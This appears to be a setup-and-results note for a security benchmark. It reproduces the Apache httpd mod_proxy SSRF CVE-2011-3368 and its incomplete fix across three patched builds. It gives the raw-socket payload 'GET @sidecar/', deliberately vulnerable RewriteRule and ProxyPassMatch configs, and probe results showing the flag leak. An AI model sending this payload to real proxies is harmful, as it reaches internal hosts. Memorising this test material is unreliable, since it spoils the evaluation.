## Roles (recipe: debian:bullseye-slim + from-source httpd 2.2.21; three source patch levels)
  V0 = httpd 2.2.21 pristine                       — neither translate hook validates the request-URI   [CVE-2011-3368 vulnerable]
  V1 = 2.2.21 + mod_rewrite.c hook_uri2file guard  — RewriteRule [P] vector fixed, ProxyPassMatch NOT   <- TARGET (incomplete fix)
  V2 = 2.2.21 + mod_rewrite.c + mod_proxy.c guards  — both front-ends fixed (== 2.2.22)
  sidecar       (internal-only, no host port)  — returns ${PCB_FLAG} for any path on :80
  legit-backend (internal-only, no host port)  — the INTENDED proxy backend, returns "legit-backend-ok"

## Two reverse-proxy front-ends per image (conf/httpd.conf), same mod_proxy routing sink
  vhost :80   RewriteRule .* http://legit-backend%{REQUEST_URI} [P]   (ORIGINAL vector)  host ports v0=38260 v1=38261 v2=38262
  vhost :8080 ProxyPassMatch ^(.*)$ http://legit-backend$1            (RESIDUAL vector)  host ports v0=38263 v1=38264 v2=38265
  Both use the classic mis-configuration (no '/' between backend authority and request-URI).

## Attack channel (SSRF-sidecar, same sink & same request-target — Variant A)
  Raw socket:  GET @sidecar/ HTTP/1.0\r\n\r\n
  -> expanded to http://legit-backend@sidecar/  => legit-backend becomes userinfo, host = sidecar
  Observable = proxied response body (flag token present iff mod_proxy routed to the sidecar)
  original (CVE-2011-3368)         : sent to the RewriteRule vhost      (route=rewrite)
  residual (CVE-2011-3639/-4317)   : sent to the ProxyPassMatch vhost   (route=proxypass)

## Mechanism (source-grounded)
  The httpd 2.2.22 fix (backport r1235443 of trunk r1209432 + r1233604) adds the identical guard
    if ((r->unparsed_uri[0]=='*' && r->unparsed_uri[1]=='\0') || !r->uri || r->uri[0] != '/') return DECLINED;
  to TWO independent translate hooks:
    - mod_rewrite.c::hook_uri2file  -> guards RewriteRule [P]        (patch.diff = the CVE-2011-3368 fix given to the method)
    - mod_proxy.c::proxy_trans       -> guards ProxyPass/ProxyPassMatch (held-out completing fix)
      (proxy_trans returns OK for an already-set r->proxyreq BEFORE its guard, so it only guards the
       ProxyPass front-end, not RewriteRule [P] — the two guards are genuinely independent.)
  V1 applies only the mod_rewrite guard, so the sibling ProxyPassMatch front-end still routes `@sidecar/`
  to the internal host => legitimate incomplete-fix residual.

## Live differential (raw-socket probes; sidecar returns the flag)
  liveness: normal `GET /` reaches legit-backend on all 6 endpoints (both vhosts, all versions)
  V0  original(RewriteRule)    -> HTTP/1.1 200 OK  + FLAG        <- SSRF (CANARY-HIT)
  V0  residual(ProxyPassMatch) -> HTTP/1.1 200 OK  + FLAG        <- SSRF (CANARY-HIT)
  V1  original(RewriteRule)    -> HTTP/1.1 400 Bad Request       <- seed BLOCKED (mod_rewrite guard DECLINEs @-uri)
  V1  residual(ProxyPassMatch) -> HTTP/1.1 200 OK  + FLAG        <- residual CONFIRMED (mod_proxy front-end still open)
  V2  original(RewriteRule)    -> HTTP/1.1 400 Bad Request       <- blocked
  V2  residual(ProxyPassMatch) -> HTTP/1.1 400 Bad Request       <- blocked (mod_proxy guard added)

